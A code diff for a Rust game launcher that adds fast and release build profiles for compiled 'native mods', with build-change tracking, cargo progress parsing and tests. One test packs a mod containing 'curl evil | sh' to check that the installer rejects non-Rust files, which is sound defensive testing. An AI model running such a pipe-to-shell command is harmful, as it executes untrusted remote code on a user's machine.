@@ -1,4 +1,4 @@
-//! Native mods (docs/native-mods.md), experimental and off by default: mixin bundles that
+//! Native mods (docs/native-mods.md): mixin bundles that
 //! levzzz5154's horizon-mixins (MIT, <https://github.com/horizon-rust/horizon-mixins>) applies to
 //! Horizon's source, which the launcher then compiles into a game of its own with its portable Rust
 //! ([`rust_toolchain`]). Unlike `.hmod` mods they are not sandboxed: their code runs with the
@@ -31,33 +31,251 @@ const PREFIX: &str = "native-";
 /// horizon-mixins, for bundles that don't name the revision they were tested with.
 const MIXINS_GIT: &str = "https://github.com/horizon-rust/horizon-mixins";
 pub const MIXINS_REV: &str = "4342a0bfbe71d4d14185528d64e496d6022f16a1";
-/// The profile builds use: the workspace's `fast` (the release's optimizations without its
-/// link-time ones, incremental), so a rebuild recompiles and links only what the mods changed.
-/// A revision without it builds with `release` ([`profile_of`]).
-const PROFILE: &str = "fast";
-const FALLBACK_PROFILE: &str = "release";
 /// The features of the release's own game (game-build.yml).
 const FEATURES: &str = "horizon-client/mods";
 
-/// Whether Native mods are on after an install into a game folder whose list is `installed`:
-/// installing a native mod turns them on, so the player only has to build. A player who never
-/// installs one keeps them off; one already on stays on.
-pub fn turns_on(on: bool, installed: &[crate::browser::installed::Entry]) -> bool {
-    on || installed.iter().any(|e| {
-        e.file
-            .strip_prefix(INSTALLED)
-            .is_some_and(|rest| rest.starts_with('/'))
-    })
+/// The Cargo profile a native build compiles with. `Fast` (the workspace's `[profile.fast]`: no
+/// LTO, 16 codegen units, incremental) is the default, so changing a mod recompiles only
+/// `horizon-client`'s changed parts; `Release` is the release's own (thin LTO, one codegen unit):
+/// slower to build, slightly faster game. Each has its own folder under `native/target/` and its
+/// own key, so the two never mix.
+#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
+pub enum Profile {
+    #[default]
+    Fast,
+    Release,
 }
 
-/// Whether installing a native mod shows its notice first (what the first build takes): once,
-/// for a player whose Native mods are still off.
-pub fn needs_notice(on: bool, noticed: bool) -> bool {
-    !on && !noticed
+impl Profile {
+    /// Cargo's name for it, and its folder in `native/target/`.
+    pub fn name(self) -> &'static str {
+        match self {
+            Self::Fast => "fast",
+            Self::Release => "release",
+        }
+    }
+
+    pub fn parse(text: &str) -> Option<Self> {
+        match text.trim() {
+            "fast" => Some(Self::Fast),
+            "release" => Some(Self::Release),
+            _ => None,
+        }
+    }
+
+    /// The profile `Settings::native_release` picks.
+    pub fn from_setting(release: bool) -> Self {
+        if release {
+            Self::Release
+        } else {
+            Self::Fast
+        }
+    }
 }
 
-/// The notice before the first native mod is installed.
-pub const NOTICE: &str = "Native mods compile into a game of their own. Installing one turns Native mods on: you then build the game with it in Settings > Native mods. The first build downloads Rust and can take 20 to 30 minutes; later builds are faster.";
+/// What a native build was made from, kept per profile in `native/built.json` after it compiled:
+/// what the next build is compared with to say what changed.
+#[derive(Clone, Debug, Default, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
+pub struct Record {
+    pub horizon: String,
+    pub mixins: String,
+    /// Each mod's id and the hash of its files.
+    pub mods: std::collections::BTreeMap<String, String>,
+}
+
+/// What a build is going to do, said before it starts.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub enum Plan {
+    /// The build already exists: nothing compiles.
+    UpToDate,
+    /// `native/target/` holds an earlier build of this profile: only what changed recompiles. The
+    /// list says what changed.
+    Incremental(Vec<String>),
+    /// Nothing built yet in this profile: the whole game compiles.
+    First,
+}
+
+impl Plan {
+    pub fn label(&self) -> String {
+        match self {
+            Self::UpToDate => "Up to date (no build needed)".into(),
+            Self::Incremental(changes) => {
+                format!("Incremental rebuild: {}", changes.join("; "))
+            }
+            Self::First => "First build: the whole game (several minutes)".into(),
+        }
+    }
+
+    /// The word in "Built in 42 s (fast, incremental)".
+    fn kind(&self) -> &'static str {
+        match self {
+            Self::UpToDate => "up to date",
+            Self::Incremental(_) => "incremental",
+            Self::First => "first build",
+        }
+    }
+}
+
+/// Which case a build is: `exists` (its version is installed), else whether an earlier build of
+/// the profile (`before`) is there to rebuild from, and what differs from `now`.
+pub fn classify(exists: bool, before: Option<&Record>, now: &Record) -> Plan {
+    if exists {
+        return Plan::UpToDate;
+    }
+    let Some(before) = before else {
+        return Plan::First;
+    };
+    let mut changes = Vec::new();
+    if before.horizon != now.horizon {
+        let short = |r: &str| r.chars().take(7).collect::<String>();
+        changes.push(format!(
+            "Horizon commit {} to {}",
+            short(&before.horizon),
+            short(&now.horizon)
+        ));
+    }
+    let changed: Vec<&str> = now
+        .mods
+        .iter()
+        .filter(|(id, hash)| before.mods.get(*id) != Some(hash))
+        .map(|(id, _)| id.as_str())
+        .chain(
+            before
+                .mods
+                .keys()
+                .filter(|id| !now.mods.contains_key(*id))
+                .map(String::as_str),
+        )
+        .collect();
+    if !changed.is_empty() {
+        changes.push(format!("mods {}", changed.join(", ")));
+    }
+    if before.mixins != now.mixins {
+        changes.push("horizon-mixins".into());
+    }
+    if changes.is_empty() {
+        changes.push("the build settings".into());
+    }
+    Plan::Incremental(changes)
+}
+
+fn records_path() -> PathBuf {
+    root().join("built.json")
+}
+
+fn read_records(path: &Path) -> std::collections::BTreeMap<String, Record> {
+    fs::read(path)
+        .ok()
+        .and_then(|bytes| serde_json::from_slice(&bytes).ok())
+        .unwrap_or_default()
+}
+
+/// The last build of `profile` that compiled, if its folder in `native/target/` is still there.
+fn last_record(profile: Profile) -> Option<Record> {
+    if !root().join("target").join(profile.name()).is_dir() {
+        return None;
+    }
+    read_records(&records_path()).remove(profile.name())
+}
+
+fn save_record(profile: Profile, record: &Record) {
+    let mut all = read_records(&records_path());
+    all.insert(profile.name().into(), record.clone());
+    if let Ok(text) = serde_json::to_vec_pretty(&all) {
+        let _ = fs::write(records_path(), text);
+    }
+}
+
+/// The hash of a bundle's files.
+fn mod_hash(b: &Bundle) -> Result<String, String> {
+    let mut hash = Sha256::new();
+    for (name, path) in files(&b.dir)? {
+        let bytes = fs::read(&path).map_err(|e| format!("{}: {e}", path.display()))?;
+        hash.update(name.as_bytes());
+        hash.update((bytes.len() as u64).to_le_bytes());
+        hash.update(&bytes);
+    }
+    Ok(hash.finalize()[..8]
+        .iter()
+        .map(|b| format!("{b:02x}"))
+        .collect())
+}
+
+/// What a cargo output line says about the compile.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub enum Cargo {
+    /// `Compiling name vX`: a crate started.
+    Compiling(String),
+    /// Cargo's progress bar, `Building [===>   ] 12/430: names`: units done, and in all.
+    Progress(usize, usize),
+}
+
+/// `line` without terminal escape sequences (`ESC [ ... letter`).
+fn without_escapes(line: &str) -> String {
+    let mut plain = String::new();
+    let mut chars = line.chars().peekable();
+    while let Some(c) = chars.next() {
+        if c == '\x1b' {
+            if chars.peek() == Some(&'[') {
+                for d in chars.by_ref() {
+                    if d.is_ascii_alphabetic() {
+                        break;
+                    }
+                }
+            }
+        } else {
+            plain.push(c);
+        }
+    }
+    plain
+}
+
+/// Cargo's events in one line of its standard error. With `CARGO_TERM_PROGRESS_WHEN=always` the
+/// progress bar is redrawn with carriage returns, so a line holds several pieces.
+pub fn parse_cargo(line: &str) -> Vec<Cargo> {
+    let mut out = Vec::new();
+    for piece in without_escapes(line).split('\r') {
+        let piece = piece.trim();
+        if let Some(name) = piece.strip_prefix("Compiling ") {
+            out.push(Cargo::Compiling(
+                name.split_whitespace().next().unwrap_or(name).to_owned(),
+            ));
+        } else if let Some(bar) = piece.strip_prefix("Building [") {
+            let counts = bar.split_once("] ").map(|(_, rest)| rest).unwrap_or("");
+            let counts = counts.split(':').next().unwrap_or("");
+            if let Some((done, total)) = counts.split_once('/') {
+                if let (Ok(done), Ok(total)) = (done.trim().parse(), total.trim().parse()) {
+                    out.push(Cargo::Progress(done, total));
+                }
+            }
+        }
+    }
+    out
+}
+
+/// What of `line` the build log keeps: all of it but cargo's progress bar, whose redraws are
+/// separated by carriage returns and may be followed on the same line by a real message
+/// (`Building [=>] 3/9: a\r\x1b[Kerror[E0425]: ...`). None when nothing else is left.
+fn log_text(line: &str) -> Option<String> {
+    let kept: Vec<String> = without_escapes(line)
+        .split('\r')
+        .filter(|piece| {
+            let piece = piece.trim();
+            !piece.is_empty() && !piece.starts_with("Building [")
+        })
+        .map(str::to_owned)
+        .collect();
+    (!kept.is_empty()).then(|| kept.join("\n"))
+}
+
+/// "1 min 5 s" style time, for the build's status.
+pub fn duration_label(secs: u64) -> String {
+    if secs >= 60 {
+        format!("{} min {} s", secs / 60, secs % 60)
+    } else {
+        format!("{secs} s")
+    }
+}
 
 /// Whether an installed version is a native-mods build.
 pub fn is_native(version: &str) -> bool {
@@ -445,13 +663,20 @@ fn has_mods_feature(source: &Path) -> bool {
     value.get("features").and_then(|f| f.get("mods")).is_some()
 }
 
-/// The profile the source at `source` builds with: [`PROFILE`] where its Cargo.toml has it.
-fn profile_of(source: &Path) -> &'static str {
+/// The profile the source at `source` builds with: `chosen`, except that `Fast` becomes `Release`
+/// (the release's own) for a revision whose Cargo.toml has no `[profile.fast]`.
+fn profile_of(source: &Path, chosen: Profile) -> Profile {
+    if chosen == Profile::Release {
+        return chosen;
+    }
     let text = fs::read_to_string(source.join("Cargo.toml")).unwrap_or_default();
     let value: toml::Table = text.parse().unwrap_or_default();
-    match value.get("profile").and_then(|p| p.get(PROFILE)) {
-        Some(_) => PROFILE,
-        None => FALLBACK_PROFILE,
+    match value
+        .get("profile")
+        .and_then(|p| p.get(Profile::Fast.name()))
+    {
+        Some(_) => Profile::Fast,
+        None => Profile::Release,
     }
 }
 
@@ -520,7 +745,7 @@ pub fn update_for(version: &str, installed: &[String]) -> Option<String> {
     newer_than(&about(version)?.base, installed)
 }
 
-fn newer_than(base: &str, installed: &[String]) -> Option<String> {
+pub fn newer_than(base: &str, installed: &[String]) -> Option<String> {
     newest_installed(installed)
         .filter(|n| *n != base && backend::compare_versions(n, base).is_gt())
         .cloned()
@@ -554,9 +779,20 @@ fn files(dir: &Path) -> Result<Vec<(String, PathBuf)>, String> {
 
 /// The installed version `bundles` built on Horizon `revision` with horizon-mixins `mixins`
 /// become: `native-<7 digits of the revision>-<12 hex digits>`.
-pub fn version_for(revision: &str, mixins: &str, bundles: &[Bundle]) -> Result<String, String> {
+pub fn version_for(
+    revision: &str,
+    mixins: &str,
+    profile: Profile,
+    bundles: &[Bundle],
+) -> Result<String, String> {
     let mut hash = Sha256::new();
-    for part in [mixins, PROFILE, FEATURES, rust_toolchain::VERSION, revision] {
+    for part in [
+        mixins,
+        profile.name(),
+        FEATURES,
+        rust_toolchain::VERSION,
+        revision,
+    ] {
         hash.update(part.as_bytes());
         hash.update([0]);
     }
@@ -579,6 +815,18 @@ pub fn version_for(revision: &str, mixins: &str, bundles: &[Bundle]) -> Result<S
     Ok(format!("{PREFIX}{}-{key}", &revision[..7]))
 }
 
+/// A digest of a mod's files (name, length, bytes, sorted by name), kept in `native-mods.json` so
+/// the Mods page sees a mod edited or reinstalled without a version bump.
+pub fn digest<'a>(files: impl Iterator<Item = (&'a str, &'a [u8])>) -> String {
+    let mut hash = Sha256::new();
+    for (name, bytes) in files {
+        hash.update(name.as_bytes());
+        hash.update((bytes.len() as u64).to_le_bytes());
+        hash.update(bytes);
+    }
+    hash.finalize().iter().map(|b| format!("{b:02x}")).collect()
+}
+
 /// Where a build is.
 #[derive(Clone, Debug, PartialEq)]
 pub enum Step {
@@ -586,15 +834,28 @@ pub enum Step {
     Tool,
     Source(String),
     Mixins,
+    /// Which case the build is, before anything runs.
+    Plan(Plan, Profile),
+    /// Crates done, the total once cargo says it, and the one just started.
+    Compile {
+        done: usize,
+        total: Option<usize>,
+        name: String,
+        profile: Profile,
+    },
     /// The mods' own crates checked against Horizon's `Cargo.lock`.
     Crates,
-    /// Crates compiled so far, and the last one.
-    Compile(usize, String),
     /// A mod's post-build step being built.
     PostBuildCompile(String),
     /// A mod's post-build step running in the new build's folder.
     PostBuild(String),
     Install,
+    /// The build ended: seconds it took.
+    Done {
+        secs: u64,
+        profile: Profile,
+        plan: Plan,
+    },
 }
 
 impl Step {
@@ -614,13 +875,35 @@ impl Step {
             ),
             Self::Mixins => tr("Applying the mixins").into(),
             Self::Crates => tr("Checking the mods' crates against Horizon's Cargo.lock").into(),
-            Self::Compile(n, name) => trf(
-                "Compiling the game: {count} crates, now {name}",
-                &[("count", &n.to_string()), ("name", name)],
-            ),
+            Self::Plan(plan, profile) => format!("{} ({})", plan.label(), profile.name()),
+            Self::Compile {
+                done,
+                total,
+                name,
+                profile,
+            } => match total {
+                Some(total) => format!(
+                    "Compiling the game ({}): {done} of {total} crates, now {name}",
+                    profile.name()
+                ),
+                None => format!(
+                    "Compiling the game ({}): {done} crates, now {name}",
+                    profile.name()
+                ),
+            },
             Self::PostBuildCompile(id) => trf("Building {name}'s post-build step", &[("name", id)]),
             Self::PostBuild(id) => trf("Running {name}'s post-build step", &[("name", id)]),
             Self::Install => tr("Installing the build").into(),
+            Self::Done {
+                secs,
+                profile,
+                plan,
+            } => format!(
+                "Built in {} ({}, {})",
+                duration_label(*secs),
+                profile.name(),
+                plan.kind()
+            ),
         }
     }
 }
@@ -647,7 +930,9 @@ fn run(mut cmd: Command, what: &str, mut line: impl FnMut(&str)) -> Result<(), S
         .lines()
         .map_while(Result::ok)
     {
-        let _ = writeln!(log, "{text}");
+        if let Some(kept) = log_text(&text) {
+            let _ = writeln!(log, "{kept}");
+        }
         line(&text);
         if text.starts_with("error") && errors.len() < 4 {
             errors.push(text.clone());
@@ -733,13 +1018,18 @@ fn apply(rust: &Toolchain, tool: &Path, source: &Path, mods: &Path, out: &Path) 
     cmd
 }
 
-/// The release's own build of the game in `stage` (game-build.yml), into `target`. It starts
+/// The build of the game in `stage` with `profile` (game-build.yml's, for `Release`), into `target`. It starts
 /// outside any Cargo configuration of the player's ([`rust_toolchain::outside_configs`]), so only
 /// the workspace's own (`stage/.cargo/config.toml`, when it has one) applies.
-fn compile(rust: &Toolchain, stage: &Path, target: &Path) -> Command {
+fn compile(rust: &Toolchain, stage: &Path, target: &Path, profile: Profile) -> Command {
     let mut cmd = cargo(rust, stage, "build");
-    cmd.env("CARGO_TARGET_DIR", target);
-    cmd.args(["--locked", "--profile", profile_of(stage)]);
+    // Cargo's progress bar (units done of the total) is read from its output. Incremental
+    // compilation, the `fast` profile's, is not turned off by the player's environment: the
+    // toolchain's command drops `CARGO_INCREMENTAL` and `CARGO_BUILD_*`.
+    cmd.env("CARGO_TARGET_DIR", target)
+        .env("CARGO_TERM_PROGRESS_WHEN", "always")
+        .env("CARGO_TERM_PROGRESS_WIDTH", "100");
+    cmd.args(["--locked", "--profile", profile.name()]);
     if has_mods_feature(stage) {
         cmd.args(["--features", FEATURES]);
     }
@@ -795,10 +1085,11 @@ fn post_build_programs(
     stage: &Path,
     target: &Path,
     programs: &Path,
+    profile: Profile,
     progress: &impl Fn(Step),
 ) -> Result<Vec<(crates::PostBuild, PathBuf)>, String> {
     let steps = crates::post_builds(stage)?;
-    let profile = profile_of(stage);
+    let profile = profile.name();
     let _ = fs::remove_dir_all(programs);
     let mut out = Vec::new();
     for (i, step) in steps.into_iter().enumerate() {
@@ -907,8 +1198,10 @@ pub fn build(
     folder: &Path,
     instance: &Instance,
     anyway: bool,
+    profile: Profile,
     progress: impl Fn(Step),
 ) -> Result<String, String> {
+    let started = std::time::Instant::now();
     backend::need_prepared(base)?;
     fs::create_dir_all(root()).map_err(|e| e.to_string())?;
     let _ = fs::write(log_path(), "");
@@ -970,8 +1263,19 @@ pub fn build(
         Some(MIXINS_REV),
         |r| committed("horizon-rust/horizon-mixins", r),
     )?;
-    let version = version_for(&revision, &mixins, &mods)?;
-    if !backend::installed().contains(&version) {
+    let version = version_for(&revision, &mixins, profile, &mods)?;
+    let now = Record {
+        horizon: revision.clone(),
+        mixins: mixins.clone(),
+        mods: mods
+            .iter()
+            .map(|m| Ok((m.id.clone(), mod_hash(m)?)))
+            .collect::<Result<_, String>>()?,
+    };
+    let exists = backend::installed().contains(&version);
+    let plan = classify(exists, last_record(profile).as_ref(), &now);
+    progress(Step::Plan(plan.clone(), profile));
+    if !exists {
         rust_toolchain::linker()?;
         let rust = rust_toolchain::install(|f| progress(Step::Rust(f)))?;
         let tool = tool(&rust, &mixins, &progress)?;
@@ -997,28 +1301,46 @@ pub fn build(
             lock_crates(&rust, &source, &stage)?;
         }
         let target = real.join("target");
-        let profile = profile_of(&stage);
-        let mut crates = 0;
+        // A revision without `[profile.fast]` builds with `release`: the build says so.
+        let profile = profile_of(&stage, profile);
+        let (mut crates, mut total, mut name) = (0, None, String::new());
         run(
-            compile(&rust, &stage, &target),
+            compile(&rust, &stage, &target, profile),
             "Compiling the game",
             |line| {
-                if let Some(name) = line.trim_start().strip_prefix("Compiling ") {
-                    crates += 1;
-                    let name = name.split_whitespace().next().unwrap_or(name);
-                    progress(Step::Compile(crates, name.to_owned()));
+                for event in parse_cargo(line) {
+                    match event {
+                        Cargo::Compiling(n) => {
+                            crates += 1;
+                            name = n;
+                        }
+                        Cargo::Progress(done, all) => {
+                            crates = crates.max(done);
+                            total = Some(all);
+                        }
+                    }
+                    if !name.is_empty() {
+                        progress(Step::Compile {
+                            done: crates,
+                            total,
+                            name: name.clone(),
+                            profile,
+                        });
+                    }
                 }
             },
         )
         .map_err(|e| blame(crates::locked(e)))?;
+        save_record(profile, &now);
         // Out of `target` before any post-build bin is built there (`post_build_programs`).
         let binary = real.join("programs").join(backend::CLIENT);
-        copy_out(&target.join(profile).join(backend::CLIENT), &binary)?;
+        copy_out(&target.join(profile.name()).join(backend::CLIENT), &binary)?;
         let post = post_build_programs(
             &rust,
             &stage,
             &target,
             &real.join("programs").join("post-build"),
+            profile,
             &progress,
         )?;
         progress(Step::Install);
@@ -1028,8 +1350,15 @@ pub fn build(
             "horizon_mixins": mixins,
             "hooks": mods.iter().find_map(|m| m.hooks),
             "rust": rust_toolchain::VERSION,
-            "profile": profile,
-            "mods": mods.iter().map(|m| serde_json::json!({"id": m.id, "version": m.version})).collect::<Vec<_>>(),
+            "profile": profile.name(),
+            "mods": mods.iter().map(|m| serde_json::json!({
+                "id": m.id,
+                "version": m.version,
+                "sha256": files(&m.dir).ok().map(|list| {
+                    let read: Vec<_> = list.iter().filter_map(|(n, p)| Some((n.clone(), fs::read(p).ok()?))).collect();
+                    digest(read.iter().map(|(n, b)| (n.as_str(), b.as_slice())))
+                }),
+            })).collect::<Vec<_>>(),
         });
         install(base, &version, &binary, &about, |dir| {
             for (step, program) in &post {
@@ -1047,6 +1376,13 @@ pub fn build(
     instances::edit(&instance.id, |meta| meta.version = Some(version.clone()))?;
     prune(&version);
     let _ = fs::remove_dir_all(&incoming);
+    if plan != Plan::UpToDate {
+        progress(Step::Done {
+            secs: started.elapsed().as_secs(),
+            profile,
+            plan,
+        });
+    }
     Ok(version)
 }
 
@@ -1156,42 +1492,6 @@ fn stale(
 #[cfg(test)]
 mod tests {
     use super::*;
-
-    /// Ludovic's decision (2026-10-29): installing a native mod turns Native mods on, after a
-    /// notice shown once; players who never install one keep them off.
-    #[test]
-    fn installing_a_native_mod_turns_native_mods_on() {
-        let entry = |file: &str| {
-            serde_json::from_value::<crate::browser::installed::Entry>(serde_json::json!({
-                "source": "horizon", "project": "p", "slug": "p", "title": "P", "kind": "mod",
-                "version": "1", "number": "1", "file": file, "checksum": "", "page": ""
-            }))
-            .unwrap()
-        };
-        let plain = [
-            entry("horizon-mods/zoom.hmod"),
-            entry("resourcepacks/x.zip"),
-        ];
-        assert!(!turns_on(false, &[]));
-        assert!(!turns_on(false, &plain), "no native mod: they stay off");
-        assert!(!turns_on(
-            false,
-            &[entry("horizon-native-mods-old/x.hnmod")]
-        ));
-        let native = [
-            plain[0].clone(),
-            entry("horizon-native-mods/veinminer.hnmod"),
-        ];
-        assert!(turns_on(false, &native));
-        assert!(turns_on(true, &plain), "on stays on");
-        // The notice: before the first one only.
-        assert!(needs_notice(false, false));
-        assert!(!needs_notice(false, true));
-        assert!(!needs_notice(true, false));
-        // Settings without the fields read as off and not noticed.
-        let s: backend::Settings = serde_json::from_str("{}").unwrap();
-        assert!(!s.native_mods && !s.native_mods_noticed);
-    }
 
     fn dir(name: &str) -> PathBuf {
         let d = std::env::temp_dir().join(format!("horizon-native-{name}-{}", std::process::id()));
@@ -1344,9 +1644,12 @@ mod tests {
         let out = installed_mods(&home).unwrap();
         let path = out.join("veinminer/mixins/veinminer/data/table.bin");
         assert_eq!(fs::read(&path).unwrap(), b"data");
-        let first = version_for(A, B, &bundles(&out).unwrap()).unwrap();
+        let first = version_for(A, B, Profile::Fast, &bundles(&out).unwrap()).unwrap();
         fs::write(path, b"changed").unwrap();
-        assert_ne!(first, version_for(A, B, &bundles(&out).unwrap()).unwrap());
+        assert_ne!(
+            first,
+            version_for(A, B, Profile::Fast, &bundles(&out).unwrap()).unwrap()
+        );
         pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
         assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
     }
@@ -1559,8 +1862,9 @@ mod tests {
     fn the_version_changes_with_the_revision_and_any_file_of_the_mods() {
         let d = dir("key");
         write_bundle(&d, "hello", "fn hook() {}");
-        let key =
-            |revision: &str| version_for(revision, MIXINS_REV, &bundles(&d).unwrap()).unwrap();
+        let key = |revision: &str| {
+            version_for(revision, MIXINS_REV, Profile::Fast, &bundles(&d).unwrap()).unwrap()
+        };
         let first = key(A);
         assert!(
             first.starts_with("native-aaaaaaa-") && first.len() == "native-aaaaaaa-".len() + 12
@@ -1568,7 +1872,10 @@ mod tests {
         assert!(is_native(&first) && !backend::is_game_tag(&first));
         assert_eq!(first, key(A));
         assert_ne!(first, key(B));
-        assert_ne!(first, version_for(A, B, &bundles(&d).unwrap()).unwrap());
+        assert_ne!(
+            first,
+            version_for(A, B, Profile::Fast, &bundles(&d).unwrap()).unwrap()
+        );
         fs::write(d.join("hook.rs"), "fn hook() { let _ = 1; }").unwrap();
         assert_ne!(first, key(A));
     }
@@ -1583,7 +1890,7 @@ mod tests {
         backend::copy_dir(&fixture, &d).unwrap();
         let found = bundles(&d).unwrap();
         assert_eq!(found[0].id, "crate_demo");
-        let key = || version_for(A, B, &bundles(&d).unwrap()).unwrap();
+        let key = || version_for(A, B, Profile::Fast, &bundles(&d).unwrap()).unwrap();
         let mut seen = vec![key()];
         for file in [
             "engine/src/lib.rs",
@@ -1598,6 +1905,150 @@ mod tests {
             assert!(!seen.contains(&now), "{file} is in the key");
             seen.push(now);
         }
+    }
+
+    #[test]
+    fn the_profile_is_in_the_key_so_fast_and_release_never_mix() {
+        let d = dir("profile-key");
+        write_bundle(&d, "hello", "fn hook() {}");
+        let found = bundles(&d).unwrap();
+        let fast = version_for(A, B, Profile::Fast, &found).unwrap();
+        let release = version_for(A, B, Profile::Release, &found).unwrap();
+        assert_ne!(fast, release);
+        assert_eq!(fast, version_for(A, B, Profile::Fast, &found).unwrap());
+    }
+
+    #[test]
+    fn fast_is_the_default_profile_and_the_setting_picks_release() {
+        assert_eq!(Profile::default(), Profile::Fast);
+        assert_eq!(Profile::from_setting(false), Profile::Fast);
+        assert_eq!(Profile::from_setting(true), Profile::Release);
+        assert_eq!(Profile::parse("fast"), Some(Profile::Fast));
+        assert_eq!(Profile::parse("release"), Some(Profile::Release));
+        assert_eq!(Profile::parse("debug"), None);
+        assert!(!crate::backend::Settings::default().native_release);
+        assert_eq!(
+            (Profile::Fast.name(), Profile::Release.name()),
+            ("fast", "release")
+        );
+    }
+
+    fn record(horizon: &str, mods: &[(&str, &str)]) -> Record {
+        Record {
+            horizon: horizon.into(),
+            mixins: "m1".into(),
+            mods: mods
+                .iter()
+                .map(|(a, b)| (a.to_string(), b.to_string()))
+                .collect(),
+        }
+    }
+
+    #[test]
+    fn a_build_is_up_to_date_incremental_or_the_first() {
+        let now = record("aaaaaaa1111", &[("zoom", "1"), ("keys", "1")]);
+        assert_eq!(classify(true, None, &now), Plan::UpToDate);
+        assert_eq!(classify(false, None, &now), Plan::First);
+        assert_eq!(
+            First_label(),
+            "First build: the whole game (several minutes)"
+        );
+        let before = record("aaaaaaa1111", &[("zoom", "1"), ("keys", "0")]);
+        assert_eq!(
+            classify(false, Some(&before), &now),
+            Plan::Incremental(vec!["mods keys".into()])
+        );
+        let mut next = record("bbbbbbb2222", &[("zoom", "2"), ("keys", "1")]);
+        let plan = classify(false, Some(&before), &next);
+        assert_eq!(
+            plan.label(),
+            "Incremental rebuild: Horizon commit aaaaaaa to bbbbbbb; mods keys, zoom"
+        );
+        // A removed mod counts as a change too.
+        next = record("aaaaaaa1111", &[("zoom", "1")]);
+        let plan = classify(false, Some(&now), &next);
+        assert_eq!(plan, Plan::Incremental(vec!["mods keys".into()]));
+        assert_eq!(
+            classify(false, Some(&now), &now),
+            Plan::Incremental(vec!["the build settings".into()])
+        );
+    }
+
+    #[allow(non_snake_case)]
+    fn First_label() -> String {
+        Plan::First.label()
+    }
+
+    #[test]
+    fn the_steps_name_the_profile_and_the_outcome() {
+        assert_eq!(
+            Step::Plan(Plan::UpToDate, Profile::Fast).label(),
+            "Up to date (no build needed) (fast)"
+        );
+        let compile = Step::Compile {
+            done: 12,
+            total: Some(430),
+            name: "serde".into(),
+            profile: Profile::Fast,
+        };
+        assert_eq!(
+            compile.label(),
+            "Compiling the game (fast): 12 of 430 crates, now serde"
+        );
+        let done = |secs, profile, plan| Step::Done {
+            secs,
+            profile,
+            plan,
+        };
+        assert_eq!(
+            done(42, Profile::Fast, Plan::Incremental(vec![])).label(),
+            "Built in 42 s (fast, incremental)"
+        );
+        assert_eq!(
+            done(125, Profile::Release, Plan::First).label(),
+            "Built in 2 min 5 s (release, first build)"
+        );
+    }
+
+    #[test]
+    fn cargos_output_gives_the_crate_and_the_progress() {
+        assert_eq!(
+            parse_cargo("   Compiling serde v1.0.228"),
+            vec![Cargo::Compiling("serde".into())]
+        );
+        assert_eq!(
+            parse_cargo("   Building [==>        ] 12/430: serde, syn"),
+            vec![Cargo::Progress(12, 430)]
+        );
+        // The bar is redrawn with carriage returns and escapes, then the next line follows.
+        assert_eq!(
+            parse_cargo(
+                "   Building [=>   ] 3/9: a\r\x1b[K   Building [==>  ] 4/9: b\r      \r   Compiling b v0.1.0"
+            ),
+            vec![
+                Cargo::Progress(3, 9),
+                Cargo::Progress(4, 9),
+                Cargo::Compiling("b".into())
+            ]
+        );
+        assert!(parse_cargo("warning: unused variable").is_empty());
+        assert!(parse_cargo("    Finished `fast` profile in 1m").is_empty());
+        // The log leaves out the progress bar, never what follows it on the same line.
+        assert_eq!(log_text("   Building [=>   ] 3/9: a"), None);
+        assert_eq!(log_text("\x1b[K"), None);
+        assert_eq!(
+            log_text("   Building [=>   ] 3/9: a\r   Compiling b v1").as_deref(),
+            Some("   Compiling b v1")
+        );
+        assert_eq!(
+            log_text("   Building [=>   ] 3/9: a\r\x1b[Kerror[E0425]: cannot find `x`").as_deref(),
+            Some("error[E0425]: cannot find `x`")
+        );
+        assert_eq!(
+            log_text("\x1b[K\x1b[33mwarning\x1b[0m: unused").as_deref(),
+            Some("warning: unused")
+        );
+        assert_eq!(log_text("warning: x").as_deref(), Some("warning: x"));
     }
 
     #[test]
@@ -1628,7 +2079,7 @@ mod tests {
     }
 
     /// levzzz5154's decision (2026-10-29): a rebuild stays on the Horizon the instance plays;
-    /// only Update moves it to a newer one.
+    /// only "Rebuild on Horizon {version}" moves it to a newer one.
     #[test]
     fn a_rebuild_stays_on_the_instances_horizon_until_an_update() {
         let installed: Vec<String> = [
@@ -1689,7 +2140,7 @@ mod tests {
             dir: PathBuf::from("/rust/1.99.1-x"),
         };
         let stage = dir("stage-config");
-        let cmd = compile(&rust, &stage, Path::new("/native/target"));
+        let cmd = compile(&rust, &stage, Path::new("/native/target"), Profile::Fast);
         let args: Vec<String> = cmd
             .get_args()
             .map(|a| a.to_string_lossy().into_owned())
@@ -1714,7 +2165,7 @@ mod tests {
         // The workspace's own configuration still applies.
         fs::create_dir_all(stage.join(".cargo")).unwrap();
         fs::write(stage.join(".cargo/config.toml"), "").unwrap();
-        let cmd = compile(&rust, &stage, Path::new("/native/target"));
+        let cmd = compile(&rust, &stage, Path::new("/native/target"), Profile::Fast);
         let args: Vec<_> = cmd.get_args().collect();
         assert_eq!(args[1], "--config");
         assert_eq!(args[2], stage.join(".cargo/config.toml"));
@@ -1723,19 +2174,24 @@ mod tests {
     #[test]
     fn builds_use_the_fast_profile_where_the_source_has_it() {
         let d = dir("profile");
-        assert_eq!(profile_of(&d), "release");
+        assert_eq!(profile_of(&d, Profile::Fast), Profile::Release);
         fs::write(d.join("Cargo.toml"), "[profile.release]\nlto = \"thin\"\n").unwrap();
-        assert_eq!(profile_of(&d), "release");
+        assert_eq!(profile_of(&d, Profile::Fast), Profile::Release);
         fs::write(
             d.join("Cargo.toml"),
             "[profile.release]\nlto = \"thin\"\n[profile.fast]\ninherits = \"release\"\n",
         )
         .unwrap();
-        assert_eq!(profile_of(&d), "fast");
+        assert_eq!(profile_of(&d, Profile::Fast), Profile::Fast);
+        assert_eq!(
+            profile_of(&d, Profile::Release),
+            Profile::Release,
+            "the player's choice of release stays"
+        );
         let rust = Toolchain {
             dir: PathBuf::from("/rust/1.99.1-x"),
         };
-        let cmd = compile(&rust, &d, Path::new("/native/target"));
+        let cmd = compile(&rust, &d, Path::new("/native/target"), Profile::Fast);
         let args: Vec<_> = cmd.get_args().collect();
         assert!(args.windows(2).any(|w| w == ["--profile", "fast"]));
     }
